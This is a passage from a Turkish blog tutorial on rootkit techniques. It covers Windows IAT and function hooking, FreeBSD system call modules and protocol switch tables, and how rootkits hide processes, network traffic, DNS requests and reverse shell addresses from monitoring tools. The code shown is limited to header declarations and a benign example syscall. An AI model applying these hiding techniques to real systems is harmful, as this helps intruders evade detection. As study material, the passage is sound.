      &lt;li&gt;Basit bir şekilde aşşağıdaki resim &lt;strong&gt;Windows API&lt;/strong&gt;‘sinin &lt;strong&gt;user32.dll&lt;/strong&gt;‘ini hook ediyor :
        &lt;ul&gt;
          &lt;li&gt;&lt;img src=&quot;https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/APIhook-2-04222014.gif&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;IAT Hooking&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;Import Address Table Hooking&lt;/strong&gt;‘e değinecek olursak şayet. &lt;strong&gt;Portable Executable&lt;/strong&gt; yani &lt;strong&gt;Çalıştırılabilir Dosya&lt;/strong&gt; içerisinde bulunan &lt;strong&gt;Import Address Table&lt;/strong&gt;‘yi &lt;strong&gt;Kancalamak&lt;/strong&gt;‘tır. Daha da basit bir şekilde :&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;IAT&lt;/strong&gt; içerisinden  &lt;strong&gt;Hook&lt;/strong&gt; edeceğimiz &lt;strong&gt;Fonksiyon&lt;/strong&gt;‘u bulduktan sonra bu &lt;strong&gt;Fonksiyon&lt;/strong&gt;‘un adresini bizim yazdığımız &lt;strong&gt;Fonksiyon&lt;/strong&gt;‘un adresi ile değiştirmektir.&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;IAT&lt;/strong&gt; basit bir şekilde &lt;strong&gt;PE Header&lt;/strong&gt;‘i içerisinden bulunabilir. Aşağıda ki resim bunu daha da basit bir şekilde sizlere özetlemektedir.
        &lt;ul&gt;
          &lt;li&gt;&lt;img src=&quot;https://resmim.net/f/jlrKbw.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Function Hooking&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;Belirlediğimiz &lt;strong&gt;Yazılım&lt;/strong&gt;‘ın içerisinde ki &lt;strong&gt;Fonksiyon&lt;/strong&gt;‘u oluşturduğumuz sahte &lt;strong&gt;Kütüphane&lt;/strong&gt;‘yi içerisine &lt;strong&gt;Load-Time&lt;/strong&gt; ya da &lt;strong&gt;Run-Time&lt;/strong&gt; zamanında sahte &lt;strong&gt;Fonksiyon&lt;/strong&gt;‘umuz ile değiştirmektir.&lt;/li&gt;
      &lt;li&gt;Bir önceki blog yazımda bunu anlattım bkz : &lt;a href=&quot;https://blacknbunny.github.io/2019/04/14/Linux-Function-Hooking.html&quot;&gt;Linux Function Hooking&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;System Call Hooking&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;Belirlediğimiz &lt;strong&gt;Yazılım&lt;/strong&gt;‘ın içerisinde bulunan asıl &lt;strong&gt;Sistem Çağrısı&lt;/strong&gt; ile sahte &lt;strong&gt;Sistem Çağrımızı&lt;/strong&gt; değiştirmek denilebilir.&lt;/li&gt;
      &lt;li&gt;Bunuda anlattığım blog yazıma sizleri alalım : &lt;a href=&quot;https://blacknbunny.github.io/2019/05/07/linux-system-call-hooking.html&quot;&gt;Linux System Call Hooking&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;system-calls&quot;&gt;System Calls&lt;/h3&gt;

&lt;p&gt;Bunlara basit bir şekilde &lt;strong&gt;Sistem Servis İstek&lt;/strong&gt;‘leri diyebiliriz.&lt;/p&gt;

&lt;p&gt;Daha da basitleştirirsek &lt;strong&gt;İşletim Sistemi&lt;/strong&gt;‘ne özel &lt;strong&gt;Çağrılar&lt;/strong&gt; yani &lt;strong&gt;Fonksiyonlar&lt;/strong&gt; diyebiliriz.&lt;/p&gt;

&lt;p&gt;Sistem çağrıları &lt;strong&gt;Kernel&lt;/strong&gt; versiyonuna göre değişsede basit bir şekilde bir kaç tane stabil &lt;strong&gt;Linux Sistem Çağrısı&lt;/strong&gt; aşağıdaki resimde bulunabilir :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/IzD89k.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bu resimi aldığım web sayfası çoğu &lt;strong&gt;Sistem Çağrısı&lt;/strong&gt;‘nı içermektedir bakmak isteyenleriniz olursa : &lt;a href=&quot;http://asm.sourceforge.net/syscall.html&quot;&gt;Syscall List&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;hooking-system-call&quot;&gt;Hooking System Call&lt;/h4&gt;

&lt;p&gt;Bir sistem çağrısını &lt;strong&gt;Hook&lt;/strong&gt; etmek için basit bir şekilde o &lt;strong&gt;Sistem Çağrısı&lt;/strong&gt;‘nın bir sahtesini oluşturup yerini değiştirmemiz gerekmektedir.&lt;/p&gt;

&lt;p&gt;Yukarıda daha önce yazdığım blog yazılarında bu kısmı daha detaylı anlattım okumayanlarınız varsa.&lt;/p&gt;

&lt;h4 id=&quot;system-call-modules&quot;&gt;System Call Modules&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Sistem Çağrısı Modül&lt;/strong&gt;‘leri basit bir şekilde &lt;strong&gt;KLD&lt;/strong&gt;‘lerdir. &lt;strong&gt;İşletim Sistem&lt;/strong&gt;‘lerinde &lt;strong&gt;Sistem Çağrı&lt;/strong&gt;‘ları &lt;strong&gt;Sistem Servis İstekleri&lt;/strong&gt;‘dir. Basit bir şekilde &lt;strong&gt;Kernel&lt;/strong&gt;‘den yani &lt;strong&gt;Çekirdek&lt;/strong&gt;‘ten bir &lt;strong&gt;Yazılım&lt;/strong&gt;‘ın &lt;strong&gt;İstek&lt;/strong&gt;‘te bulunmak için kullandığı bir &lt;strong&gt;Mekanizma&lt;/strong&gt;‘dır.&lt;/p&gt;

&lt;p&gt;Her &lt;strong&gt;Sistem Çağrı Modülü&lt;/strong&gt; için 3 ayrı öğe vardır. Bunlar &lt;strong&gt;System Call Function&lt;/strong&gt;, &lt;strong&gt;sysent structure&lt;/strong&gt;, &lt;strong&gt;offset value&lt;/strong&gt;‘den oluşmaktadır.&lt;/p&gt;

&lt;h4 id=&quot;system-call-function&quot;&gt;System Call Function&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;&amp;lt;sys/sysent.h&amp;gt;&lt;/strong&gt; içerisinde &lt;strong&gt;Prototip&lt;/strong&gt;‘i bulunan bir &lt;strong&gt;Fonksiyon&lt;/strong&gt;‘dur bu&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Parametre&lt;/strong&gt;‘leri ve &lt;strong&gt;Tip&lt;/strong&gt;‘i yukarıda bahsettiğimiz &lt;strong&gt;sysent.h&lt;/strong&gt; başlık içerisinde şu şekildedir :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;typedef int     sy_call_t(struct thread *, void *);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;thread&lt;/strong&gt; parametresi çalışmakta olan &lt;strong&gt;Thread&lt;/strong&gt;‘i &lt;strong&gt;Point&lt;/strong&gt; etmektedir.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;void&lt;/strong&gt; ise belirtilecek &lt;strong&gt;Sistem Çağrı&lt;/strong&gt;‘sının &lt;strong&gt;Argüman Yapısı&lt;/strong&gt;‘nı &lt;strong&gt;Point&lt;/strong&gt; yani &lt;strong&gt;İşaret&lt;/strong&gt; etmektedir.&lt;/p&gt;

&lt;p&gt;Basit bir şekilde bu &lt;strong&gt;Fonksiyon&lt;/strong&gt;‘un &lt;strong&gt;Örnek&lt;/strong&gt; kullanımı aşşağıdaki gibidir :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;struct sc_example_args {
	char *str;
};
	static int
	sc_example(struct thread *td, void *syscall_args){
		struct sc_example_args *uap;
		uap = (struct sc_example_args *)syscall_args;
		
		printf(&quot;%s\n&quot;, uap-&amp;gt;str);
		
		return(0);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bu örnek kısaca bir &lt;strong&gt;Argüman&lt;/strong&gt; alıp bunu &lt;strong&gt;Sistem Konsol&lt;/strong&gt;‘una &lt;strong&gt;Output&lt;/strong&gt; ediyor ve &lt;strong&gt;printf&lt;/strong&gt; aracılığıyla bunu dışarıya yazdırıyor.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Sistem Çağrısı Fonksiyon&lt;/strong&gt;‘ları &lt;strong&gt;Kernel&lt;/strong&gt; içerisinde &lt;strong&gt;Alan&lt;/strong&gt; ayırarak işleme geçerler.&lt;/p&gt;

&lt;p&gt;Ayrıca bu çağrılar genellik ile &lt;strong&gt;User Space&lt;/strong&gt; ve &lt;strong&gt;Kernel Space&lt;/strong&gt; içerisinde &lt;strong&gt;İstek&lt;/strong&gt; beklerler.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;User Space&lt;/strong&gt; içerisinde &lt;strong&gt;User-mode application&lt;/strong&gt;‘lar çalışmakta olduğu için bu &lt;strong&gt;Application&lt;/strong&gt;‘lar &lt;strong&gt;User Space&lt;/strong&gt; içerisinden sistem çağrılarını alırlar.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Kernel Space&lt;/strong&gt; içerisinde de &lt;strong&gt;LKM&lt;/strong&gt;‘ler gibi &lt;strong&gt;Kernel Modül&lt;/strong&gt;‘leri çalışmakta olduğundan bu modüllerde &lt;strong&gt;Kernel-mode application&lt;/strong&gt;‘lar sayılır ve bu &lt;strong&gt;Application&lt;/strong&gt;‘lar &lt;strong&gt;Sistem Çağrı&lt;/strong&gt;‘ları için &lt;strong&gt;Kernel&lt;/strong&gt;‘den &lt;strong&gt;İstek&lt;/strong&gt;‘te bulunur.&lt;/p&gt;

&lt;h4 id=&quot;sysent-structure&quot;&gt;sysent structure&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Sistem Çağrı&lt;/strong&gt;‘ları basit bir şekilde &lt;strong&gt;Entry&lt;/strong&gt;‘leri ile bir &lt;strong&gt;sysent&lt;/strong&gt; yapısının içerisinde belirtilirler. Ve aşşağıdaki şekilde &lt;strong&gt;&amp;lt;sys/sysent.h&amp;gt;&lt;/strong&gt; başlığı içerisinde belirtilmiştir bu &lt;strong&gt;Structure&lt;/strong&gt; yani &lt;strong&gt;Yapı&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;struct sysent {
	int sy_narg;  /* argüman sayısı */
	sy_call_t *sy_call;  /* sistem çağrısı yada fonksiyon ismi*/
	au_event_t sy_auevent;  /* sistem çağrısı ile ilişkili denetim durumu */
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Örnek bir &lt;strong&gt;Sistem Çağrısı&lt;/strong&gt;‘nın bu &lt;strong&gt;Yapı&lt;/strong&gt; içerisinde belirtilmesi :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static struct sysent sc_example_sysent = {
		1,    /* argüman sayısı */
		sc_ornek  /* sistem çağrısı yada fonksiyon ismi */
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Basit bir şekilde içinde &lt;strong&gt;Sistem Çağrı&lt;/strong&gt;‘larını barındıran bir &lt;strong&gt;Array&lt;/strong&gt; diyebiliriz buna &lt;strong&gt;sysent[]&lt;/strong&gt;.&lt;/p&gt;

&lt;h4 id=&quot;offset-value&quot;&gt;Offset Value&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Sistem Çağrı&lt;/strong&gt;‘sının &lt;strong&gt;Sayısı&lt;/strong&gt; olarak bilinmektedir.&lt;/p&gt;

&lt;p&gt;Benzersiz &lt;strong&gt;0&lt;/strong&gt; ile &lt;strong&gt;456&lt;/strong&gt; arasında her bir &lt;strong&gt;Sistem Çağrı&lt;/strong&gt;‘sının kendine özgü bir sayısı mevcuttur.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;offset&lt;/strong&gt; değerini &lt;strong&gt;NO_SYSCALL&lt;/strong&gt; ile değiştirirsek &lt;strong&gt;sysent&lt;/strong&gt; içerisinde ileride bulunan ve kullanılmayan &lt;strong&gt;offset&lt;/strong&gt;‘e geçiş yaparız oluşturduğumuz yada kullanacağımız &lt;strong&gt;Sistem Çağrı&lt;/strong&gt;‘sı ile.&lt;/p&gt;

&lt;p&gt;Örnek :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static int offset = NO_SYSCALL;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;modfind-function&quot;&gt;modfind Function&lt;/h4&gt;

&lt;p&gt;Bir &lt;strong&gt;Kernel Modülü&lt;/strong&gt;‘nü bulmak için kullanılan &lt;strong&gt;Fonksiyon&lt;/strong&gt;‘dur.&lt;/p&gt;

&lt;p&gt;Örnek :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;sys/param.h&amp;gt;
#include &amp;lt;sys/module.h&amp;gt;

int
modfind(const char *modname);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;modstat-function&quot;&gt;modstat Function&lt;/h4&gt;

&lt;p&gt;Bir &lt;strong&gt;Kernel Modülü&lt;/strong&gt;‘nün &lt;strong&gt;Status&lt;/strong&gt;‘ünü yani &lt;strong&gt;Durumu&lt;/strong&gt;‘nu döndüren &lt;strong&gt;Fonksiyon&lt;/strong&gt;‘dur.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;sys/param.h&amp;gt;
#include &amp;lt;sys/module.h&amp;gt;

int
modstat(int modid, struct module_stat *stat);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Dönecek bilgi &lt;strong&gt;stat&lt;/strong&gt; argüman’ı içerisinde tutulmaktadır. Bu argüman &lt;strong&gt;&amp;lt;sys/module.h&amp;gt;&lt;/strong&gt; başlığında belirtilmiştir.&lt;/p&gt;

&lt;h4 id=&quot;syscall-function&quot;&gt;syscall Function&lt;/h4&gt;

&lt;p&gt;Bir &lt;strong&gt;Sistem Çağrı&lt;/strong&gt;‘sını çağırmak için kullanılan bir &lt;strong&gt;Fonksiyon&lt;/strong&gt;‘dur.&lt;/p&gt;

&lt;p&gt;Bunuda &lt;strong&gt;Sistem Çağrı&lt;/strong&gt;‘sının &lt;strong&gt;Offset Value&lt;/strong&gt;‘sini alarak o çağrıyı çalıştırır.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;sys/syscall.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

int
syscall(int number, ...);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Yani &lt;strong&gt;Sistem Çağrı&lt;/strong&gt;‘sının sayısını &lt;strong&gt;syscall function&lt;/strong&gt;‘una verdiğimizde o &lt;strong&gt;Sistem Çağrısını&lt;/strong&gt; çalıştırır.&lt;/p&gt;

&lt;h3 id=&quot;network-connections&quot;&gt;Network Connections&lt;/h3&gt;

&lt;p&gt;Bir &lt;strong&gt;Rootkit&lt;/strong&gt;‘in &lt;strong&gt;Internet&lt;/strong&gt; altında gerçekleştirdiklerini sırayla altta yazmış bulunmaktayım.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Bir &lt;strong&gt;Rootkit&lt;/strong&gt; çalışma sırasında kendini &lt;strong&gt;Internet&lt;/strong&gt; içerisinde gizlemek için &lt;strong&gt;Wireshark&lt;/strong&gt;‘ın kullandığı &lt;strong&gt;Sistem Çağrı&lt;/strong&gt;‘ları ile oynayıp &lt;strong&gt;TCP&lt;/strong&gt;, &lt;strong&gt;UDP&lt;/strong&gt; vs.. gibi &lt;strong&gt;Internet Protokol&lt;/strong&gt;‘lerinde kendini gizleyebilmektedir. Dolayısıyla &lt;strong&gt;Rootkit&lt;/strong&gt;‘in gerçekleştirdiği &lt;strong&gt;Request&lt;/strong&gt;‘ler &lt;strong&gt;Rootkit&lt;/strong&gt; tarafından gizlenebilmektedir.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Wireshark&lt;/strong&gt; bir örnekti başka bir örnek olarak &lt;strong&gt;Linux&lt;/strong&gt; içerisinde gerçekleşen ağ izleme için kullanılmakta olan &lt;strong&gt;Yazılım&lt;/strong&gt;‘lardan kendini gizleyebildiği için sistem içerisinde %100 gizlilik elde edebilmektedir.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Rootkit&lt;/strong&gt; geliştirmek sadece akılda oluşturulabilecek senaryolarla sınırlıdır. Yani eğer siz bu &lt;strong&gt;Rootkit&lt;/strong&gt;‘i sistem içerisinde bir dosya olmaktan yada bir &lt;strong&gt;DNS Sunucu&lt;/strong&gt;‘suna &lt;strong&gt;Request&lt;/strong&gt; attığında bu &lt;strong&gt;Request&lt;/strong&gt;‘i gizlemek bir senaryo olabilir. Dolayısıyla sistem içerisinde yapabileceğiniz tüm değişim, etkileşim aklımızda bitmektedir.&lt;/li&gt;
  &lt;li&gt;Sistem içerisinde kullanılan &lt;strong&gt;TCP&lt;/strong&gt;, &lt;strong&gt;UDP&lt;/strong&gt;, &lt;strong&gt;ICMP&lt;/strong&gt; protokolleri bir &lt;strong&gt;Rootkit&lt;/strong&gt; tarafından düzenlenebilmektedir.&lt;/li&gt;
  &lt;li&gt;Bir &lt;strong&gt;DNS Yazılım&lt;/strong&gt;‘ının kullandığı &lt;strong&gt;Sistem Çağrısı&lt;/strong&gt; bir &lt;strong&gt;Rootkit&lt;/strong&gt; tarafından düzenlenebildiği için o &lt;strong&gt;Yazılım&lt;/strong&gt; içerisinde kayıt altında tutulan &lt;strong&gt;DNS Request Log&lt;/strong&gt;‘larından &lt;strong&gt;Rootkit&lt;/strong&gt; kendi attığı &lt;strong&gt;DNS Request&lt;/strong&gt;‘lerini yani &lt;strong&gt;DNS İstek&lt;/strong&gt;‘lerini gizleyebilmektedir.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/edv0td.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Sistem Çağrıları&lt;/strong&gt;, &lt;strong&gt;Sürücüler&lt;/strong&gt;, &lt;strong&gt;Diskler&lt;/strong&gt; bunların hepsi içerisinde &lt;strong&gt;Sistem&lt;/strong&gt;‘den &lt;strong&gt;Çağrı&lt;/strong&gt; yani &lt;strong&gt;Fonksiyon&lt;/strong&gt; isteğinde bulunduğundan bunlar &lt;strong&gt;Rootkit&lt;/strong&gt; tarafından düzenlenebilmektedir.&lt;/p&gt;

&lt;p&gt;Bir senaryo olması açısından &lt;strong&gt;Router&lt;/strong&gt;‘imizin sunucusuna ulaşılırsa şayet içerisine eklenilebilecek bir &lt;strong&gt;Rootkit&lt;/strong&gt; ile &lt;strong&gt;ISP&lt;/strong&gt; arasında &lt;strong&gt;Giden, Gelen&lt;/strong&gt; izlenilebilir.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Rootkit&lt;/strong&gt;‘lerin &lt;strong&gt;Backdoor&lt;/strong&gt; alması için birçok yol mevcut olmasına rağmen genellik ile &lt;strong&gt;Rootkit&lt;/strong&gt;‘ler kendi içerisinde en azından aldığı bir &lt;strong&gt;Reverse Shell&lt;/strong&gt;‘in bile beklemede olduğu &lt;strong&gt;IP:PORT&lt;/strong&gt; adreslerini gizleyebilmektedir.&lt;/p&gt;

&lt;h3 id=&quot;processes&quot;&gt;Processes&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Rootkit&lt;/strong&gt;‘in &lt;strong&gt;İnternet&lt;/strong&gt; içinde gizlenmesinin yanı sıra kendini gizlediği alanlardan biride &lt;strong&gt;Process&lt;/strong&gt;‘lerdir. Örneğin &lt;strong&gt;Windows&lt;/strong&gt;‘ta &lt;strong&gt;Görev Yöneticisi&lt;/strong&gt;‘ni açtığınızda orada &lt;strong&gt;explorer.exe&lt;/strong&gt;‘yi görebilirsiniz.&lt;/p&gt;

&lt;p&gt;Bu &lt;strong&gt;explorer.exe&lt;/strong&gt; bir &lt;strong&gt;Rootkit&lt;/strong&gt; olsaydı şayet onu orada göremezdiniz sebebide &lt;strong&gt;Görev Yöneticisi&lt;/strong&gt; bile &lt;strong&gt;Sistem Çağrı&lt;/strong&gt;‘larını kullanmaktadır.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Rootkit&lt;/strong&gt; kendini gizleyebildiği gibi bu gizlenmeninde ortaya çıkması için kullanılan methodlar vardır.&lt;/p&gt;

&lt;p&gt;Örneğin &lt;strong&gt;Process Hacker&lt;/strong&gt; yazılımı içerisinde &lt;strong&gt;Gizlenmiş Process&lt;/strong&gt;‘leri bulmak mümkün.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/mkuzbs.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tabi bu &lt;strong&gt;Gizlenmiş Process&lt;/strong&gt;‘i bulmak için kullanılan methodlarında yapısını tersine kullanan methodlar mevcut.&lt;/p&gt;

&lt;p&gt;Dolayısı ile hep bir kaçış dönüyor &lt;strong&gt;Rootkit&lt;/strong&gt; kelimesinin derinlerinde.&lt;/p&gt;

&lt;h3 id=&quot;bsd-communication-protocols&quot;&gt;BSD Communication Protocols&lt;/h3&gt;

&lt;p&gt;İsimdende anlaşılabileceği gibi &lt;strong&gt;BSD İletişim Protokolleri&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Bu &lt;strong&gt;İletişim Protokolleri&lt;/strong&gt; kurallardan oluşmuştur ve iki &lt;strong&gt;İletişim&lt;/strong&gt; halinde olan &lt;strong&gt;İşlem&lt;/strong&gt; tarafından kullanılır.&lt;/p&gt;

&lt;p&gt;Buna bir örnek olması için &lt;strong&gt;( TCP/IP Protocol )&lt;/strong&gt; öne çıkarılabilir.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;FreeBSD&lt;/strong&gt; içerisinde bir &lt;strong&gt;İletişim Protokol&lt;/strong&gt;‘u &lt;strong&gt;Protocol Switch Table&lt;/strong&gt; yani &lt;strong&gt;protosw[]&lt;/strong&gt; içerisinde &lt;strong&gt;Kayıt&lt;/strong&gt;‘ları ile tanımlanır.&lt;/p&gt;

&lt;p&gt;Bu &lt;strong&gt;Kayıtlar&lt;/strong&gt; düzenlenebildiği için &lt;strong&gt;Rootkit&lt;/strong&gt; bunun karşısında eli boş kalmamaktadır.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/YdCqXV.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ve bu sayede bir &lt;strong&gt;Rootkit&lt;/strong&gt;‘in birçok &lt;strong&gt;Network Layer&lt;/strong&gt;‘ini &lt;strong&gt;Manipule&lt;/strong&gt; etmesi mümkün.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Communication Endpoint&lt;/strong&gt; tarafından &lt;strong&gt;Gönderilen&lt;/strong&gt; ve &lt;strong&gt;Alınan&lt;/strong&gt; istekleri bir &lt;strong&gt;Rootkit&lt;/strong&gt; düzenleyebilmektedir.&lt;/p&gt;

&lt;h4 id=&quot;protosw-structure&quot;&gt;protosw Structure&lt;/h4&gt;

&lt;p&gt;Her bir &lt;strong&gt;Protocol Swich Table&lt;/strong&gt; kayıdı &lt;strong&gt;protosw&lt;/strong&gt; yapısının içerisinde tutulur.&lt;/p&gt;

&lt;p&gt;Bu &lt;strong&gt;Structure&lt;/strong&gt;‘in yani &lt;strong&gt;Yapı&lt;/strong&gt;‘nın kaynak kodları &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;sys/protosw.h&amp;gt;&lt;/code&gt; başlık dosyasında bulunmaktadır.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;struct protosw {
	short   pr_type;                /* socket tipi */        
	struct  domain *pr_domain;      /* domain protokolü */        
	short   pr_protocol;            /* protokol numarası */        
	short   pr_flags;/* protokol hookları */        
	pr_input_t *pr_input;           /* protokol için input */        
	pr_output_t *pr_output;         /* protokol için output */
	
	pr_ctlinput_t *pr_ctlinput;     /* control input */        
	pr_ctloutput_t *pr_ctloutput;   /* control output */        
	pr_usrreq_t     *pr_ousrreq;/* utility hookları*/       
	pr_init_t *pr_init;        pr_fasttimo_t *pr_fasttimo;     /* hızlı timeout(200 ms)*/        
	pr_slowtimo_t *pr_slowtimo;     /* yavaş timeout(500 ms) */        
	pr_drain_t *pr_drain;           /* mümkün olan fazlalıkları boşaltmak için */        
	struct  pr_usrreqs *pr_usrreqs; /* supersedes pr_usrreq() */
	
	};

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Örneğin yukarıdaki &lt;strong&gt;Structure&lt;/strong&gt;‘yi bir &lt;strong&gt;Rootkit&lt;/strong&gt; çok basit bir şekilde &lt;strong&gt;Manipule&lt;/strong&gt; edebilmektedir yani düzenleyebilmektedir.&lt;/p&gt;

&lt;h4 id=&quot;inetsw-switch-table&quot;&gt;inetsw[] Switch Table&lt;/h4&gt;

&lt;p&gt;Her bir &lt;strong&gt;İletişim Protokol&lt;/strong&gt;‘unun &lt;strong&gt;protosw&lt;/strong&gt; yapısı &lt;code class=&quot;highlighter-rouge&quot;&gt;/sys/netinet/in_proto.c&lt;/code&gt; dosyasında belirlenmiştir. Bu dosyadan bir parça :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/DMcOWo.jpg&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://resmim.net/f/tRVlcZ.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bir &lt;strong&gt;Rootkit&lt;/strong&gt;‘in &lt;strong&gt;İletişim Protokol&lt;/strong&gt;‘leri ile manipulasyon senaryosuna girmemesi için hiçbir neden yok.&lt;/p&gt;

&lt;p&gt;Düzenlemeler sonucunda &lt;strong&gt;Protokol&lt;/strong&gt; değişimleri incelenebilir olucaktır.&lt;/p&gt;

&lt;p&gt;Tabi bu değişiklikleri farkeden bazı &lt;strong&gt;Yazılım&lt;/strong&gt;‘lar mevcut olduğundan o &lt;strong&gt;Yazılım&lt;/strong&gt;‘ları atlatmanın yollarıda mevcuttur.&lt;/p&gt;

&lt;h4 id=&quot;mbuf-structure&quot;&gt;mbuf Structure&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Veri ve Kontrol Bilgisi&lt;/strong&gt; denilebilir kısaca &lt;strong&gt;mbuf&lt;/strong&gt; yapısına.&lt;/p&gt;

&lt;p&gt;Aynı zamanda &lt;strong&gt;Network Data&lt;/strong&gt; yani &lt;strong&gt;Ağ Verisi&lt;/strong&gt; için bir &lt;strong&gt;Memory Buffer&lt;/strong&gt; yani &lt;strong&gt;Ara Bellek&lt;/strong&gt;‘tir.&lt;/p&gt;

&lt;p&gt;Aşşağıdaki resimde bu &lt;strong&gt;Yapı&lt;/strong&gt;‘nın içeriklerini görebiliriz.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/Lcus10.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;İki &lt;strong&gt;Communation Process&lt;/strong&gt; içerisinde geçen &lt;strong&gt;Veri&lt;/strong&gt; ve &lt;strong&gt;Kontrol&lt;/strong&gt; bilgisi bu &lt;strong&gt;Yapı&lt;/strong&gt; yani &lt;strong&gt;Structure&lt;/strong&gt; içerisinde tutulur.&lt;/p&gt;

&lt;p&gt;Bu &lt;strong&gt;Structure&lt;/strong&gt; yani &lt;strong&gt;Yapı&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;sys/mbuf.h&amp;gt;&lt;/code&gt; başlık dosyası içerisinde tanımlanmıştır.&lt;/p&gt;

&lt;p&gt;Bu &lt;strong&gt;Veri&lt;/strong&gt;‘yi &lt;strong&gt;Okumak&lt;/strong&gt; ya da &lt;strong&gt;Düzenlemek&lt;/strong&gt; için &lt;strong&gt;mbuf Structure&lt;/strong&gt; içerisinde bilmemiz gereken iki alan mevcuttur.&lt;/p&gt;

&lt;ol&gt;
